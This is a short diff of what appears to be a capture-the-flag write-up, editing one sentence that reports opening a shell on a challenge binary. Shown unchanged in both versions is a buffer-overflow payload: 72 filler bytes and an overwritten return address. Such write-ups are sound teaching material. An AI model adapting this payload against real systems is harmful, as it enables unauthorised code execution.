@@ -437,7 +437,7 @@ ls
 README.md  call_me_baby  exploit1.py  exploit2.py
 ```
 
-We successfully opened a shell, so our final payload is : `"\x41"*72+"\xb0\x11\x40\x00"+"\x00"*4`.
+We've successfully opened a shell, so our final payload is : `"\x41"*72+"\xb0\x11\x40\x00"+"\x00"*4`.
 
 # Exploit
 
